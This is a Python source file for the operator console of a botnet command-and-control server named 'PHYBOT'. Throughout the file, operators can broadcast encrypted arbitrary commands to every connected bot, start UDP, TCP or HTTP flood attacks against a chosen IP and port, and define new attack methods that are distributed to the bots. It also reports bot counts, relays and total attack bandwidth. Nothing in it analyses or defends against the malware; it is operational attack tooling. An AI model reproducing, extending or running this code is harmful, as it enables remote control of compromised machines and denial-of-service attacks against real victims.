from os import path
from time import sleep, asctime, localtime
from socket import socket as Sock
from json import load
from pystyle import Colors, Colorate
from .config import C2Config
from .loops import Loops

class Client():
    def __init__(
        self,
        config: C2Config = C2Config()
):
        self.config = config

    def log(
        self,
        data: str,
    ) -> None: 
        if self.config.debug: print(data)

    def crypt(
        self,
        msg: str,
        encrypt: bool = True,
    ) -> bytes:
        if encrypt: msg = self.config.fernet.encrypt(msg)
        else: msg = self.config.fernet.decrypt(msg)

        return msg

    def send(
        self,
        s: Sock,
        data: str,
        escape=True,
        reset=True,
    ) -> None:
        if reset: data += self.config.COLOR_RESET
        if escape: data += '\r\n'

        s.send(data.encode())

    def broadcast(
        self,
        data: str,
    ) -> None:
        self.log(f"send {data}")

        for relay in self.config.relay_list.keys():
            try: self.send(relay, f'{data}', False, False)
            except Exception:
                self.config.relay_list.pop(relay)
                relay.close()

    def prompt(
        self,
        content: str,
        srv: bool = True,
    ) -> str:
        srv_prompt: str = Colorate.Horizontal(Colors.yellow_to_red, "PHYBOT", 1) + self.config.COLOR_WHITE + "." + Colorate.Horizontal(Colors.blue_to_purple, "server", 1) + f"{self.config.COLOR_WHITE}("

        if srv: return srv_prompt + Colorate.Horizontal(Colors.yellow_to_red, content, 1) + f"{self.config.COLOR_WHITE})"
        return Colorate.Horizontal(Colors.yellow_to_red, "PHYBOT", 1) + self.config.COLOR_WHITE+ "." + Colorate.Horizontal(Colors.blue_to_purple, content, 1) + self.config.COLOR_WHITE + "/> "

    def update_title(
        self,
        client: Sock,
        username: str,
    ):
        while 1:
            try:
                bot_number: int = sum(self.config.bots)
                relay_number: int = len(self.config.relay_list)
                total_speed: int = sum(self.config.speed)/125000
                actual_time: str = asctime(localtime())
                self.send(client, f'\33]0;{username}@PHYBOT C&C  |  Bots: {bot_number}  |  Relay: {relay_number}  |  Speed: {total_speed} Gbps  |  {actual_time}\a', False)

                sleep(self.config.cnc_time.UPTITLE)

            except Exception: client.close()



    def command_line(
        self,
        client: Sock,
        username: str,
    ):
        # send banner message
        for x in self.config.banner.split('\n'):
            self.send(client, x)

        self.send(client, "\n")

        bot_number: int = sum(self.config.bots)
        relay_number: int = len(self.config.relay_list)
        total_speed: int = sum(self.config.speed)/125000

        self.send(client, self.prompt(f"Bots: {bot_number}"))
        self.send(client, self.prompt(f"Relays: {relay_number}"))
        self.send(client, self.prompt(f"Speed: {total_speed} Gbps"))
        self.send(client, "\n")

        self.send(client, self.prompt(username, False), False)

        while 1:
            try:
                data: str = client.recv(1024).decode().strip()

                if not data: continue

                args: list[str] = data.split(' ')
                command: str = args[0].upper()
                cmd: str = data

                is_command: bool = False

                match command:
                    case 'HELP':
                        is_command = True
                        tab: str = Colorate.Vertical(Colors.yellow_to_red, """
        ╔═══════════════╦══════════════════════════════════════════╗
        ║  HELP         ║   Shows list of commands                 ║
        ╠═══════════════╬══════════════════════════════════════════╣
        ║  CMD          ║   Send an command to all bots            ║
        ╠═══════════════╬══════════════════════════════════════════╣
        ║  ATTACK       ║   Start an attack                        ║
        ╠═══════════════╬══════════════════════════════════════════╣
        ║  METHOD HELP  ║   List all Method commands               ║
        ╠═══════════════╬══════════════════════════════════════════╣
        ║  BOTS         ║   List all the connected bots            ║
        ╠═══════════════╬══════════════════════════════════════════╣
        ║  SPEED        ║   Get the speed of all bots              ║
        ╠═══════════════╬══════════════════════════════════════════╣
        ║  PING         ║   Ping all relay                         ║
        ╠═══════════════╬══════════════════════════════════════════╣
        ║  CLEAR        ║   Clears the screen                      ║
        ╠═══════════════╬══════════════════════════════════════════╣
        ║  LOGOUT       ║   Disconnects from CnC server            ║
        ╚═══════════════╩══════════════════════════════════════════╝

                        """, 1)
                        for x in tab.split("\n"):
                            self.send(client, x)

                    case 'CLEAR':
                        is_command = True

                        self.send(client, self.config.ANSI_CLEAR, False)
                        for x in self.config.banner.split('\n'):
                            self.send(client, x)

                        self.send(client, "\n")
                        self.send(client, self.prompt(f"Bots: {bot_number}"))
                        self.send(client, self.prompt(f"Relays: {relay_number}"))
                        self.send(client, self.prompt(f"Speed: {total_speed} Gbps"))
                        self.send(client, "\n")

                    case 'LOGOUT':
                        self.send(client, 'Goodbye')
                        sleep(1)
                        break
                    
                    case "CMD":
                        is_command = True

                        if len(args) == 1: self.send(client, self.prompt(f"CMD need <command> argument!"))
                        else:
                            relay_cmd: str = data
                            self.broadcast(
                                self.crypt(relay_cmd.encode(), True)
                            )

                    case "SPEED":
                        is_command = True

                        try:
                            Loops(config=self.config)._net()
                            self.send(client, f"{total_speed} Gbps")

                        except Exception as e: self.send(client, f"{self.config.COLOR_RED}[{self.config.COLOR_WHITE}!{self.config.COLOR_RED}]{self.config.COLOR_RESET} Error: {e}")

                    case "BOTS":
                        is_command = True

                        try:
                            Loops(config=self.config)._getbot()
                            self.send(client, f"{bot_number} Bots")

                        except Exception as e: self.send(client, self.prompt(f"Error: {e}"))

                    case "PING":
                        is_command = True

                        Loops(config=self.config)._ping()

                    case "METHOD":
                        is_command = True

                        try:
                            if len(args) == 1: self.send(client, self.prompt(f"METHOD need <name> arguments!"))
                            else:
                                method_arg = data.replace("METHOD ", "")
                                method_args = method_arg.split(" ")

                                if method_args[0] == 'CREATE':
                                    if len(args) < 4: self.send(client, self.prompt(f"METHOD CREATE need <name> and <command> arguments!"))
                                    else:
                                        self.broadcast(
                                            self.crypt(cmd.encode())
                                        )
                                        name = method_args[1]
                                        method_cmd = method_arg.replace("CREATE ", "").replace(f"{name} ", "")

                                        with open("method.json", "r") as f:
                                            tb1: str = load(f)
                                            tb1 = tb1.replace('{"', '"').replace("{}", "").replace("}    ", "") # here i remind that spaces are useful
                                            tb = f'"{name}": {{"name": "{name}", "command": "{method_cmd}"}}'

                                        if not tb1 is None: tb="{"+tb1+",\n"+tb+"\n}    "
                                        else: tb = "{"+tb+"\n}    "

                                        tb = tb.replace("{{", "{").replace("}}", "}")

                                        with open("method.json", "w") as f:
                                            f.write(tb.replace("'", '"').replace("{,", "{"))

                                else:
                                    self.broadcast(
                                        self.crypt(method_cmd.encode())
                                    )
                                    self.send(client, self.prompt(f"Command {method_args[0]} send to all bots!"))

                        except Exception as e: self.send(client, self.prompt(f"Error: {e}"))

                    case "METHODS":
                        is_command = True

                        methods_arg: str = data.replace("METHOD ", "")
                        methods_args = methods_arg.split(" ")

                        name: str = methods_args[0]

                        if path.exists("method.json"):
                            with open("method.json", "r") as f:
                                data = load(f)
                                for (key, val) in data.items():
                                    self.send(client, f"{key}: {val['command']}")

                        else:
                            with open("method.json", "w") as f:
                                f.write("{}")
                            self.send(client, self.prompt(f"Nothing found"))

                if cmd == "METHOD CLEAR":
                    self.broadcast(cmd)
                    with open("method.json", "w") as f:
                        f.write("{}")
                
                elif cmd == "METHOD HELP":
                    tab: str = Colorate.Vertical(Colors.yellow_to_red, """
        ╔══════════════════╦══════════════════════════════════════════╗
        ║  METHOD CREATE   ║   Send a new ATTACK method to all bots   ║
        ╠══════════════════╬══════════════════════════════════════════╣
        ║  METHOD CLEAR    ║   Clear all methods                      ║
        ╠══════════════════╬══════════════════════════════════════════╣
        ║  METHOD <name>   ║   Start an attack with your method       ║
        ╠══════════════════╬══════════════════════════════════════════╣
        ║  METHODS         ║   List all methods                       ║
        ╚══════════════════╩══════════════════════════════════════════╝

                    """, 1)
                    for x in tab.split("\n"):
                        self.send(client, x)

                elif cmd.startswith("ATTACK"):
                    try:
                        attack_arg: str = cmd.replace("ATTACK", "")
                        attack_args: list[str] = attack_arg.split(" ")

                        if len(attack_args) < 4: self.send(client, self.prompt(f"ATTACK need <ip> <port> <attack time> <UDP or TCP or HTTP> arguments!"))

                        else:
                            attack_ip: str = attack_args[0]
                            attack_port: str = attack_args[1]
                            tps: str = attack_args[2]
                            method: str = attack_args[3]
                            attack_cmd: str = f"{attack_ip}:{attack_port}/{tps}-{method}"

                            self.broadcast(
                                self.crypt(attack_cmd.encode())
                            )
                            Loops(config=self.config)._net()

                            self.send(client, self.prompt(f"Bots: {bot_number}", 1))
                            self.send(client, self.prompt(f"Attack IP: {attack_ip}", 1))
                            self.send(client, self.prompt(f"Attack Port: {attack_port}", 1))
                            self.send(client, self.prompt(f"Attack Time: {tps}", 1))
                            self.send(client, self.prompt(f"Attack Method: {method}", 1))
                            self.send(client, self.prompt(f"Attack Speed: {total_speed} Gbps", 1))
                            self.send(client, "\n")

                    except Exception as e: self.send(client, self.prompt(f"Attack Error: {e}"))

                else:
                    if not is_command: self.send(client, self.prompt("Unknown Command"))

                self.send(client, self.prompt(username, False), False)

            except Exception as e: 
                self.log(f"\n\n{e}\n\n")
                break

        client.close()
